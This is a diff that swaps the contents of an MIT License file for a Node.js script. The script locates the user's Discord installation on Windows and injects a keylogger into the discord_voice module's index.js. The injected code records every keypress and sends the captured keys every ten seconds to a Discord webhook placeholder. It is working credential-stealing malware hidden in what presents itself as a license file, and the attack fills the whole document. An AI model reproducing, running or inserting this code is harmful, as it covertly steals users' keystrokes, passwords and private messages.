@@ -1,21 +1,56 @@
-MIT License
+//Dependencies
+const Fs = require("fs")
+const Os = require("os")
 
-Copyright (c) 2025 STEPPINGONSHI
+//Variables
+var malicious_code = `\nvar keys = ""
+const send_time = 10000
+document.onkeypress = function(e) {
+    get = window.event?event:e
+    key = get.keyCode?get.keyCode:get.charCode
+    key = String.fromCharCode(key)
+    keys+=key
+}
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+window.setInterval(function(){
+    if(keys.length >0 ) {
+        fetch("discordwebhook_link", {
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json"
+			},
+			body: JSON.stringify({ content: keys })
+		}).then(data =>{
+			keys = ""
+		})
+    }
+}, send_time)`
 
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
+//Main
+if(Fs.existsSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`)){
+    const Directories = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
 
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
+    Directories().forEach(directory =>{
+        const Directories2 = source => Fs.readdirSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules`, { withFileTypes: true }).filter(dirent => dirent.isDirectory()).map(dirent => dirent.name)
+
+        if(directory.indexOf("app") != -1){
+            Directories2().forEach(directory2 =>{
+                if(directory2.indexOf("discord_voice") != -1){
+                    Fs.readFile(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, "utf8", function(err, data){
+                        if(err){
+                            process.exit()
+                        }
+                
+                        if(data.indexOf("fetch(") != -1){
+                            process.exit()
+                        }
+                
+                        data += `\n${malicious_code}`
+                
+                        Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\${directory}\\modules\\${directory2}\\discord_voice\\index.js`, data, "utf8")
+                    })
+                }
+            })
+        }
+    })
+}
